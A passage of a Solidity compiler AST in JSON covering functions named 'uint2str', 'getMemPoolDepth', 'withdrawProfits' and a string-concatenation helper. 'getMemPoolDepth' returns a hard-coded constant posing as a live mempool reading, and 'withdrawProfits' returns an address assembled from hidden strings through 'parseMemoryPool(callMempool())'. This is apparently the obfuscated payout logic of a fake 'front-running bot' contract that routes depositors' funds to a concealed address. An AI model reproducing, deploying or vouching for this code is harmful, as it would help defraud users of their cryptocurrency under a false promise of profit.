															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "17111:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17102:16:0"
											},
											{
												"body": {
													"id": 1555,
													"nodeType": "Block",
													"src": "17145:87:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1549,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1534,
																		"name": "bstr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1519,
																		"src": "17160:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1537,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1536,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "--",
																		"prefix": false,
																		"src": "17165:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1535,
																			"name": "k",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1526,
																			"src": "17165:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "17160:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 1546,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1542,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "17183:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "+",
																					"rightExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1545,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1543,
																							"name": "_i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1487,
																							"src": "17188:2:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "%",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "3130",
																							"id": 1544,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "17193:2:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_10_by_1",
																								"typeString": "int_const 10"
																							},
																							"value": "10"
																						},
																						"src": "17188:7:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "17183:12:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1541,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "17177:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1540,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "17177:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1547,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "17177:19:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1539,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "17172:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1538,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "17172:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1548,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "17172:25:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "17160:37:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1550,
															"nodeType": "ExpressionStatement",
															"src": "17160:37:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1553,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1551,
																	"name": "_i",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1487,
																	"src": "17212:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1552,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "17218:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "17212:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1554,
															"nodeType": "ExpressionStatement",
															"src": "17212:8:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1533,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1531,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1487,
														"src": "17136:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1532,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "17142:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "17136:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1556,
												"nodeType": "WhileStatement",
												"src": "17129:103:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1559,
															"name": "bstr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1519,
															"src": "17256:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1558,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17249:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1557,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17249:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1560,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17249:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1491,
												"id": 1561,
												"nodeType": "Return",
												"src": "17242:19:0"
											}
										]
									},
									"documentation": null,
									"id": 1563,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uint2str",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1488,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1487,
												"mutability": "mutable",
												"name": "_i",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1563,
												"src": "16805:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1486,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "16805:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16804:9:0"
									},
									"returnParameters": {
										"id": 1491,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1490,
												"mutability": "mutable",
												"name": "_uintAsString",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1563,
												"src": "16837:27:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1489,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16837:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16836:29:0"
									},
									"scope": 1680,
									"src": "16787:482:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1570,
										"nodeType": "Block",
										"src": "17334:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "333135333935",
													"id": 1568,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "17352:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_315395_by_1",
														"typeString": "int_const 315395"
													},
													"value": "315395"
												},
												"functionReturnParameters": 1567,
												"id": 1569,
												"nodeType": "Return",
												"src": "17345:13:0"
											}
										]
									},
									"documentation": null,
									"id": 1571,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolDepth",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1564,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "17302:2:0"
									},
									"returnParameters": {
										"id": 1567,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1566,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1571,
												"src": "17328:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1565,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "17328:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17327:6:0"
									},
									"scope": 1680,
									"src": "17278:88:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1581,
										"nodeType": "Block",
										"src": "17434:56:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1577,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1369,
																"src": "17468:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1578,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "17468:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1576,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 905,
														"src": "17452:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1579,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17452:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1575,
												"id": 1580,
												"nodeType": "Return",
												"src": "17445:37:0"
											}
										]
									},
									"documentation": null,
									"id": 1582,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawProfits",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1572,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "17399:2:0"
									},
									"returnParameters": {
										"id": 1575,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1574,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1582,
												"src": "17425:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1573,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "17425:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17424:9:0"
									},
									"scope": 1680,
									"src": "17375:115:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1678,
										"nodeType": "Block",
										"src": "17770:537:0",
										"statements": [
											{
												"assignments": [
													1592
												],
												"declarations": [
													{
														"constant": false,
														"id": 1592,
														"mutability": "mutable",
														"name": "_baseBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1678,
														"src": "17781:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1591,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17781:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1597,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1595,
															"name": "_base",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1584,
															"src": "17813:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1594,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17807:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1593,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17807:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1596,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17807:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17781:38:0"
											},
											{
												"assignments": [
													1599
												],
												"declarations": [
													{
														"constant": false,
														"id": 1599,
														"mutability": "mutable",
														"name": "_valueBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1678,
														"src": "17830:24:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1598,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17830:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1604,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1602,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1586,
															"src": "17863:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1601,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17857:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1600,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17857:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1603,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17857:13:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17830:40:0"
											},
											{
												"assignments": [
													1606
												],
												"declarations": [
													{
														"constant": false,
														"id": 1606,
														"mutability": "mutable",
														"name": "_tmpValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1678,
														"src": "17884:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1605,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17884:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1615,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1613,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1609,
																	"name": "_baseBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1592,
																	"src": "17921:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1610,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "17921:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1611,
																	"name": "_valueBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1599,
																	"src": "17941:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1612,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "17941:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "17921:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1608,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "17910:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														},
														"typeName": {
															"id": 1607,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17914:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														}
													},
													"id": 1614,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17910:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17884:76:0"
											},
											{
												"assignments": [
													1617
												],
												"declarations": [
													{
														"constant": false,
														"id": 1617,
														"mutability": "mutable",
														"name": "_newValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1678,
														"src": "17971:22:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1616,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17971:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1622,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1620,
															"name": "_tmpValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1606,
															"src": "18002:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1619,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17996:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1618,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17996:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1621,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17996:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17971:41:0"
											},
											{
												"assignments": [
													1624
												],
												"declarations": [
													{
														"constant": false,
														"id": 1624,
														"mutability": "mutable",
														"name": "i",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1678,
														"src": "18026:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1623,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "18026:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1625,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "18026:6:0"
											},
											{
												"assignments": [
													1627
												],
												"declarations": [
													{
														"constant": false,
														"id": 1627,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1678,
														"src": "18043:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1626,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "18043:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1628,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "18043:6:0"
											},
											{
												"body": {
													"id": 1649,
													"nodeType": "Block",
													"src": "18098:57:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1647,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1640,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1617,
																		"src": "18113:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1643,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1642,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "18123:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1641,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1627,
																			"src": "18123:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "18113:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1644,
																		"name": "_baseBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1592,
																		"src": "18130:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1646,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1645,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1624,
																		"src": "18141:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
